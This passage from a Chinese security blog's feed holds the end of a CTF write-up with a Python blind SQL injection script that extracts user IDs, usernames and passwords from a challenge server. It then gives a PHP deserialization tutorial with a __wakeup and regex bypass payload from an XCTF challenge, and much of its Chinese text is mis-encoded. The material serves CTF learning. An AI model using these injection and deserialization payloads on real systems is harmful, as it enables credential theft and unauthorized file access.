src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729204429740.png" alt="image-20230729204429740"></p><h4 id="å®˜æ–¹æ³¨å…¥è„šæœ¬"><a href="#å®˜æ–¹æ³¨å…¥è„šæœ¬" class="headerlink" title="å®˜æ–¹æ³¨å…¥è„šæœ¬"></a>å®˜æ–¹æ³¨å…¥è„šæœ¬</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">charset = <span class="string">&quot;,@&quot;</span>+ string.digits + string.ascii_lowercase + string.ascii_uppercase</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">s</span>):</span><br><span class="line">    s = s.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;/**/&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">sql = r(<span class="string">&quot;select concat(id,username,password) from users&quot;</span>)</span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> charset:</span><br><span class="line">        cc = <span class="built_in">ord</span>(c)</span><br><span class="line">        url = <span class="string">f&quot;http://challenge-ebd076868bb77c54.sandbox.ctfhub.com:10800/image.php?id=-1/**/or/**/(ascii(mid((<span class="subst">&#123;sql&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;cc&#125;</span>)&quot;</span></span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(r.text) &gt; <span class="number">1024</span>:</span><br><span class="line">            result += c</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729204144756.png" alt="image-20230729204144756"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2021-ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›-Web-WebsiteManger&quot;&gt;&lt;a href=&quot;#2021-ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›-Web-WebsiteManger&quot; class=&quot;headerlink&quot; title=&quot;2021-ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›-Web-</summary>
      
    
    
    
    <category term="CTF" scheme="https://iahzl.github.io/categories/CTF/"/>
    
    <category term="ctfhub" scheme="https://iahzl.github.io/categories/CTF/ctfhub/"/>
    
    
    <category term="web" scheme="https://iahzl.github.io/tags/web/"/>
    
    <category term="sqlæ³¨å…¥" scheme="https://iahzl.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="ssrf" scheme="https://iahzl.github.io/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>ååºåˆ—åŒ–</title>
    <link href="https://iahzl.github.io/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://iahzl.github.io/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2023-08-05T08:58:37.000Z</published>
    <updated>2023-08-05T09:02:55.695Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h1><h2 id="PHP-ååºåˆ—åŒ–"><a href="#PHP-ååºåˆ—åŒ–" class="headerlink" title="PHP ååºåˆ—åŒ–"></a>PHP ååºåˆ—åŒ–</h2><h3 id="serialize"><a href="#serialize" class="headerlink" title="serialize()"></a>serialize()</h3><p>serialize() â€”&gt; å‡½æ•°ç”¨äºåºåˆ—åŒ–å¯¹è±¡æˆ–æ•°ç»„ï¼Œå¹¶è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class test&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$a</span>= <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$bb</span>= <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$ccc</span>= True;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span>= <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="title function_ invoke__">echoserialize</span>(<span class="variable">$r</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$array_t</span>= <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>=&gt;<span class="string">&quot;1&quot;</span>,<span class="string">&quot;bb&quot;</span>=&gt;<span class="string">&quot;2&quot;</span>,<span class="string">&quot;ccc&quot;</span>=&gt;<span class="string">&quot;3&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$array_t</span>);</span><br></pre></td></tr></table></figure><blockquote><p>O:4:â€testâ€:3:{s:1:â€aâ€;s:1:â€1â€;s:2:â€bbâ€;i:2;s:3:â€cccâ€;b:1;}<br>a:3:</p></blockquote><p>å„ä¸ªå­—ç¬¦çš„æ„ä¹‰ â€”&gt; <code>ç¬¬ä¸€ä¸ªå­—æ¯O ä»£è¡¨ Objectï¼Œaä»£è¡¨ arrayï¼Œsä»£è¡¨ stringï¼Œ,iè¡¨ç¤ºæ•°å­—</code></p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/640" alt="img"><br><strong>ç±»çš„å±æ€§æœ‰ä¸‰ç§ private protected å’Œ public</strong></p><p>PHP åºåˆ—åŒ–çš„æ—¶å€™ <strong>private</strong>å’Œ <strong>protected</strong> å˜é‡ä¼šå¼•å…¥ä¸å¯è§å­—ç¬¦<code>%00</code>ï¼Œ<code>%00ç±»å%00å±æ€§å</code> ä¸ºprivateï¼Œ<code>%00*%00å±æ€§å</code> ä¸ºprotectedï¼Œæ³¨æ„è¿™ä¸¤ä¸ª <strong>%00</strong>å°±æ˜¯ ascii ç ä¸º0 çš„å­—ç¬¦ã€‚è¿™ä¸ªå­—ç¬¦æ˜¾ç¤ºå’Œè¾“å‡ºå¯èƒ½çœ‹ä¸åˆ°ï¼Œç”šè‡³å¯¼è‡´æˆªæ–­ï¼Œä½†æ˜¯urlç¼–ç åå°±å¯ä»¥çœ‹å¾—æ¸…æ¥š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class test&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$a</span>= <span class="string">&quot;a&quot;</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$b</span>= <span class="string">&quot;b&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$c</span>= <span class="string">&quot;c&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span>= <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$r</span>));</span><br></pre></td></tr></table></figure><blockquote><p>O:4:â€testâ€:3:{s:7:â€testaâ€;s:1:â€aâ€;s:4:â€*bâ€;s:1:â€bâ€;s:1:â€câ€;s:1:â€câ€;}</p><p>O%3A4%3A%22test%22%3A3%3A%7Bs%3A7%3A%22%00test%00a%22%3Bs%3A1%3A%22a%22%3Bs%3A4%3A%22%00%2A%00b%22%3Bs%3A1%3A%22b%22%3Bs%3A1%3A%22c%22%3Bs%3A1%3A%22c%22%3B%7D</p></blockquote><h3 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize()"></a>unserialize()</h3><p>unserialize() â€”&gt; å‡½æ•°ç”¨äºå°†é€šè¿‡ serialize()å‡½æ•°åºåˆ—åŒ–åçš„å¯¹è±¡æˆ–æ•°ç»„è¿›è¡Œååºåˆ—åŒ–ï¼Œå¹¶è¿”å›åŸå§‹çš„å¯¹è±¡ç»“æ„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sites</span> = <span class="keyword">array</span>(<span class="string">&#x27;t1&#x27;</span>, <span class="string">&#x27;tt2&#x27;</span>, <span class="string">&#x27;ttt3&#x27;</span>);</span><br><span class="line"><span class="variable">$serialized_data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$sites</span>);</span><br><span class="line"><span class="comment">#echo  $serialized_data;</span></span><br><span class="line"><span class="variable">$unserialized_data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialized_data</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$unserialized_data</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>Array<br>(<br>â€‹ [0] &#x3D;&gt; t1<br>â€‹ [1] &#x3D;&gt; tt2<br>â€‹ [2] &#x3D;&gt; ttt3<br>)</p></blockquote><h3 id="å¸¸ç”¨é­”æ³•å‡½æ•°"><a href="#å¸¸ç”¨é­”æ³•å‡½æ•°" class="headerlink" title="å¸¸ç”¨é­”æ³•å‡½æ•°"></a>å¸¸ç”¨é­”æ³•å‡½æ•°</h3><table><thead><tr><th align="left">å¸¸ç”¨é­”æ³•å‡½æ•°</th><th align="center">å®šä¹‰</th></tr></thead><tbody><tr><td align="left">__construct()</td><td align="center">åœ¨åˆ›å»ºå¯¹è±¡æ—¶å€™åˆå§‹åŒ–å¯¹è±¡ï¼Œä¸€èˆ¬ç”¨äºå¯¹å˜é‡èµ‹åˆå€¼ã€‚åˆ›å»ºä¸€ä¸ªæ–°çš„ç±»æ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨è¯¥æ–¹æ³•</td></tr><tr><td align="left">__destruct()</td><td align="center">å’Œæ„é€ å‡½æ•°ç›¸åï¼Œå½“å¯¹è±¡æ‰€åœ¨å‡½æ•°è°ƒç”¨å®Œæ¯•åæ‰§è¡Œ.å³å½“ä¸€ä¸ªç±»è¢«é”€æ¯æ—¶è‡ªåŠ¨è°ƒç”¨è¯¥æ–¹æ³•</td></tr><tr><td align="left">__toString()</td><td align="center">å½“å¯¹è±¡è¢«å½“åšä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è°ƒç”¨ã€‚</td></tr><tr><td align="left">__sleep()</td><td align="center">å½“è°ƒç”¨<code>serialize()</code>å‡½æ•°æ—¶ï¼ŒPHP å°†è¯•å›¾åœ¨åºåˆ—åŠ¨ä½œä¹‹å‰è°ƒç”¨è¯¥å¯¹è±¡çš„æˆå‘˜å‡½æ•° __sleep()ã€‚è¿™å°±å…è®¸å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰åšä»»ä½•æ¸…é™¤æ“ä½œ</td></tr><tr><td align="left">__wakeup()</td><td align="center">ååºåˆ—åŒ–æ¢å¤å¯¹è±¡ä¹‹å‰è°ƒç”¨è¯¥æ–¹æ³•.å½“ä½¿ç”¨ unserialize() æ¢å¤å¯¹è±¡æ—¶ï¼Œ å°†è°ƒç”¨ __wakeup() æˆå‘˜å‡½æ•°</td></tr><tr><td align="left">__invoke()</td><td align="center">æŠŠä¸€ä¸ªå®ä¾‹å¯¹è±¡å½“ä½œå‡½æ•°ä½¿ç”¨æ—¶è‡ªåŠ¨è°ƒç”¨</td></tr><tr><td align="left">__call()</td><td align="center">å½“è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•ä¼šè‡ªåŠ¨è°ƒç”¨è¯¥æ–¹æ³•ã€‚</td></tr><tr><td align="left">__get()</td><td align="center">åœ¨è°ƒç”¨ç§æœ‰å±æ€§çš„æ—¶å€™ä¼šè‡ªåŠ¨æ‰§è¡Œ</td></tr><tr><td align="left">__isset()</td><td align="center">åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘</td></tr><tr><td align="left">__unset()</td><td align="center">åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</td></tr></tbody></table><p><strong>__wakeup() bypass</strong></p><p>åœ¨éœ€è¦å¯¹__wakeup() è¿›è¡Œç»•è¿‡çš„æ—¶å€™ï¼Œå¯ä»¥è®©åºåˆ—åŒ–ç»“æœä¸­ç±»å±æ€§çš„æ•°å€¼å¤§äºå…¶çœŸæ­£çš„æ•°å€¼è¿›è¡Œç»•è¿‡ï¼Œè¿™ä¸ªæ–¹å¼é€‚ç”¨äºPHP &lt; 5.6.25 å’Œ PHP&lt; 7.0.10</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class User&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;Bob&quot;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&quot;nameis Bob &lt;/br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&quot;exit&lt;/br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&quot;u&quot;</span>]));</span><br></pre></td></tr></table></figure><p>POST å‚æ•°O:4:â€Userâ€:1:{s:4:â€nameâ€;s:3:â€Bobâ€;}å¯ä»¥çœ‹åˆ°è¾“å‡ºæ˜¯ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">object</span>(User)[<span class="number">1</span>]</span><br><span class="line"> <span class="keyword">public</span> <span class="string">&#x27;name&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;Bob&#x27;</span> (length=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">nameis Bob</span><br></pre></td></tr></table></figure><p>å¦‚æœåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¸æƒ³è®©__wakeup() æ‰§è¡Œï¼Œå¯ä»¥å°† â€œUserâ€åçš„ 2 æ”¹ä¸ºä¸€ä¸ªæ¯”2 å¤§çš„æ•°å­—</p><p>POST å‚æ•°O:4:â€Userâ€:2:{s:4:â€nameâ€;s:3:â€Bobâ€;}ï¼š</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nameis <span class="keyword">Bob</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">booleanfalse</span></span><br></pre></td></tr></table></figure><hr><p><strong>[XCTF]Web â€“ Web_php_unserialize</strong></p><p>é¢˜ç›®æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;   <span class="comment">#æ„é€ å‡½æ•°ï¼Œå¯¹ç±»çš„å˜é‡è¿›è¡Œåˆå§‹åŒ–</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;  <span class="comment">#é­”æœ¯æ–¹æ³•ï¼Œå¦‚æœæœ‰ååºåˆ—åŒ–çš„ä½¿ç”¨ï¼Œåœ¨ååºåˆ—åŒ–ä¹‹å‰ä¼šå…ˆè°ƒç”¨è¿™ä¸ªæ–¹æ³•</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123;         <span class="comment">#å­˜åœ¨$var                   </span></span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]);   <span class="comment">#å°†$var base64è§£ç å¹¶èµ‹å€¼$var</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ€è·¯ï¼šä¸»è¦æ˜¯æ­£åˆ™ç»•è¿‡å’Œ_wakeupï¼ˆï¼‰ç»•è¿‡</p><p>æ­£åˆ™åŒ¹é…ï¼šå› ä¸ºä¸èƒ½åŒ¹é…<code>O:4</code>è¿™ç§ï¼Œæˆ‘ä»¬å¯ä»¥<code>O:+4</code>ç»•è¿‡ï¼Œå› ä¸ºåœ¨urlç¼–ç ä¸­<code>+</code>ä¼šè¢«è½¬æ¢ä¸ºç©ºæ ¼</p><p>__wakeup()ç»•è¿‡ï¼šè®©åºåˆ—åŒ–ç»“æœä¸­ç±»å±æ€§çš„æ•°å€¼å¤§äºå…¶çœŸæ­£çš„æ•°å€¼è¿›è¡Œç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;fl4g.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> demo;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);  <span class="comment">//echo  O:4:&quot;Demo&quot;:1:&#123;s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span></span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$b</span>);<span class="comment">//ç»•è¿‡preg_match</span></span><br><span class="line"><span class="variable">$b</span>= <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$b</span>);<span class="comment">//ç»•è¿‡wakeup</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$b</span>);     </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><blockquote><p>TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ&#x3D;&#x3D;</p></blockquote><p>å†è¿›è¡Œgetä¼ å‚å³å¯</p><h3 id="phpåºåˆ—åŒ–è¡¥å……"><a href="#phpåºåˆ—åŒ–è¡¥å……" class="headerlink" title="phpåºåˆ—åŒ–è¡¥å……"></a>phpåºåˆ—åŒ–è¡¥å……</h3><p>åŸç†ï¼šæœªå¯¹ç”¨æˆ·è¾“å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œæ£€æµ‹ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ§åˆ¶ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œä»è€Œå¯¼è‡´ä»£ç <br>æ‰§è¡Œï¼ŒSQL æ³¨å…¥ï¼Œç›®å½•éå†ç­‰ä¸å¯æ§åæœã€‚åœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­è‡ªåŠ¨è§¦å‘äº†æŸäº›é­”æœ¯æ–¹æ³•ã€‚å½“è¿›è¡Œ<br>ååºåˆ—åŒ–çš„æ—¶å€™å°±æœ‰å¯èƒ½ä¼šè§¦å‘å¯¹è±¡ä¸­çš„ä¸€äº›é­”æœ¯æ–¹æ³•ã€‚</p><p><strong>serialize() &#x2F;&#x2F;å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆä¸€ä¸ªå­—ç¬¦ä¸²</strong><br><strong>unserialize() &#x2F;&#x2F;å°†å­—ç¬¦ä¸²è¿˜åŸæˆä¸€ä¸ªå¯¹è±¡</strong></p><p>è§¦å‘ï¼š<code>unserialize </code>å‡½æ•°çš„å˜é‡å¯æ§ï¼Œæ–‡ä»¶ä¸­å­˜åœ¨å¯åˆ©ç”¨çš„ç±»ï¼Œç±»ä¸­æœ‰é­”æœ¯æ–¹æ³•ï¼š</p><blockquote><p>æ‰€æœ‰phpé‡Œé¢çš„å€¼éƒ½å¯ä»¥ä½¿ç”¨å‡½æ•°serialize()æ¥è¿”å›ä¸€ä¸ªåŒ…å«å­—èŠ‚æµçš„å­—ç¬¦ä¸²æ¥è¡¨ç¤ºã€‚unserialize()å‡½æ•°èƒ½å¤Ÿé‡æ–°æŠŠå­—ç¬¦ä¸²å˜å›phpåŸæ¥çš„å€¼ã€‚ åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡å°†ä¼šä¿å­˜å¯¹è±¡çš„æ‰€æœ‰å˜é‡ï¼Œä½†æ˜¯ä¸ä¼šä¿å­˜å¯¹è±¡çš„æ–¹æ³•ï¼Œåªä¼šä¿å­˜ç±»çš„åå­—ã€‚</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__call() //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span><br><span class="line">__callStatic() //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span><br><span class="line">__get() //ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</span><br><span class="line">__set() //ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span><br><span class="line">__isset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨ isset()æˆ– empty()è§¦å‘</span><br><span class="line">__unset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨ <span class="built_in">unset</span>()æ—¶è§¦å‘</span><br><span class="line">__invoke() //å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span><br></pre></td></tr></table></figure><h3 id="æ„é€ å‡½æ•°ä¸ææ„å‡½æ•°"><a href="#æ„é€ å‡½æ•°ä¸ææ„å‡½æ•°" class="headerlink" title="æ„é€ å‡½æ•°ä¸ææ„å‡½æ•°"></a>æ„é€ å‡½æ•°ä¸ææ„å‡½æ•°</h3><ul><li>__construct()<br>å…·æœ‰æ„é€ å‡½æ•°çš„ç±»ä¼šåœ¨æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡æ—¶å…ˆè°ƒç”¨æ­¤æ–¹æ³•ï¼Œæ‰€ä»¥éå¸¸é€‚åˆåœ¨ä½¿ç”¨å¯¹è±¡ä¹‹å‰åšä¸€äº›åˆå§‹åŒ–å·¥ä½œã€‚</li><li>__destruct()<br>ææ„å‡½æ•°ä¼šåœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œã€‚</li></ul><p><code>new</code>å‡ºä¸€ä¸ªæ–°çš„å¯¹è±¡æ—¶å°±ä¼šè°ƒç”¨__construct(),è€Œå¯¹è±¡è¢«é”€æ¯æ—¶ï¼Œä¾‹å¦‚ç¨‹åºé€€å‡ºæ—¶ï¼Œå°±ä¼šè°ƒç”¨__destruct()</p><h3 id="åºåˆ—åŒ–ç»†èŠ‚"><a href="#åºåˆ—åŒ–ç»†èŠ‚" class="headerlink" title="åºåˆ—åŒ–ç»†èŠ‚"></a>åºåˆ—åŒ–ç»†èŠ‚</h3><h4 id="åºåˆ—åŒ–å«ä¹‰"><a href="#åºåˆ—åŒ–å«ä¹‰" class="headerlink" title="åºåˆ—åŒ–å«ä¹‰"></a>åºåˆ—åŒ–å«ä¹‰</h4><p>ä¾‹å¦‚ï¼š<code>O:4:&quot;user&quot;:2:&#123;s:3:&quot;age&quot;;i:18;s:4:&quot;name&quot;;s:3:&quot;LEO&quot;;&#125;</code><br> 